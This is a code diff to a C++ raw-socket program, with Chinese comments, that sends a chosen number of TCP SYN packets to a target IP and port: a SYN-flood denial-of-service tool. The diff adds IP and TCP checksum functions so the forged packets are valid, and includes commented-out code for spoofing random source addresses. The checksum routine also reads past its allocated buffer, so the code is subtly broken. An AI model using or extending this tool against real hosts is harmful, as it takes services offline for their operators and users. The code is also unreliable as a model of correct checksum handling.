@@ -13,6 +13,54 @@
 
 using namespace std;
 
+const char *g_source_ip = "127.0.0.1";
+
+unsigned short calc_checksum(unsigned short *buf, int len) {
+  unsigned long sum = 0;
+  while (len > 1) {
+    sum += *buf++;
+    len -= 2;
+  }
+  if (len == 1) {
+    sum += *(unsigned char *)buf;
+  }
+  sum = (sum >> 16) + (sum & 0xFFFF);
+  sum += (sum >> 16);
+  return ~sum;
+}
+
+unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph,
+                            int data_len) {
+  const int buf_len = sizeof(iph->saddr) + sizeof(iph->daddr) + 4 +
+                      sizeof(struct tcphdr) + data_len;
+  char *buf = (char *)malloc(buf_len);
+
+  // fill pseudo ip header
+  memcpy(buf, &iph->saddr, sizeof(iph->saddr));
+  memcpy(buf + sizeof(iph->saddr), &iph->daddr, sizeof(iph->daddr));
+  buf[sizeof(iph->saddr) + sizeof(iph->daddr)] = 0;
+  buf[sizeof(iph->saddr) + sizeof(iph->daddr) + 1] = IPPROTO_TCP;
+  unsigned short tcp_len = htons(sizeof(struct tcphdr) + data_len);
+  memcpy(buf + sizeof(iph->saddr) + sizeof(iph->daddr) + 2, &tcp_len,
+         sizeof(tcp_len));
+
+  // fill tcp header
+  memcpy(buf + sizeof(iph->saddr) + sizeof(iph->daddr) + 4, tcph,
+         sizeof(struct tcphdr));
+
+  // fill tcp body
+  memset(
+      buf + sizeof(iph->saddr) + sizeof(iph->daddr) + 4 + sizeof(struct tcphdr),
+      0, data_len);
+
+  tcph->check = 0;
+  unsigned short checksum =
+      calc_checksum((unsigned short *)buf,
+                    sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
+  free(buf);
+  return checksum;
+}
+
 int main(int argc, char *argv[]) {
   if (argc != 4) {
     cout << "Usage: " << argv[0] << " <target_ip> <target_port> <num_packets>"
@@ -26,7 +74,7 @@ int main(int argc, char *argv[]) {
   int num_packets = atoi(argv[3]);
 
   // 创建原始套接字
-  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if (sockfd < 0) {
     cout << "Failed to create raw socket." << endl;
     return 1;
@@ -43,8 +91,11 @@ int main(int argc, char *argv[]) {
   ip_header.ttl = 255;
   ip_header.protocol = IPPROTO_TCP;
   ip_header.check = 0;
-  ip_header.saddr = inet_addr("127.0.0.1");
+  ip_header.saddr = inet_addr(g_source_ip);
   ip_header.daddr = inet_addr(target_ip);
+
+  ip_header.check =
+      calc_checksum((unsigned short *)&ip_header, sizeof(struct iphdr));
 
   // 构造 TCP 报文头部
   struct tcphdr tcp_header;
@@ -53,7 +104,7 @@ int main(int argc, char *argv[]) {
   tcp_header.seq = rand() % 65535;
   tcp_header.ack_seq = 0;
   tcp_header.res1 = 0;
-  tcp_header.doff = sizeof(struct tcphdr) / 4;
+  tcp_header.doff = 5;
   tcp_header.fin = 0;
   tcp_header.syn = 1;
   tcp_header.rst = 0;
@@ -73,18 +124,18 @@ int main(int argc, char *argv[]) {
   srand(time(NULL));  // 设置随机种子
 
   for (int i = 0; i < num_packets; i++) {
-    ip_header.id = htons(rand() % 65535);       // 设置随机标识符
+    ip_header.id = htons(rand() % 65535);  // 设置随机标识符
     tcp_header.source = htons(rand() % 65535);  // 设置随机源端口号
     tcp_header.seq = rand() % 65535;            // 设置随机序列号
 
+    // generate random source ip
+    // ip_header.saddr = rand();
+    // ip_header.check = 0;
+    // ip_header.check =
+    //     calc_checksum((unsigned short *)&ip_header, sizeof(struct iphdr));
+
     // 计算校验和
-    tcp_header.check = 0;
-    uint32_t sum = 0;
-    memcpy(&sum, &ip_header.saddr, sizeof(ip_header.saddr));
-    memcpy(&sum + sizeof(ip_header.saddr), &ip_header.daddr,
-           sizeof(ip_header.daddr));
-    sum += htons(IPPROTO_TCP + ntohs(sizeof(tcp_header)));
-    tcp_header.check = htons(~(sum & 0xFFFF));
+    tcp_header.check = tcp_checksum(&ip_header, &tcp_header, 0);
 
     // 发送 SYN 报文
     char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
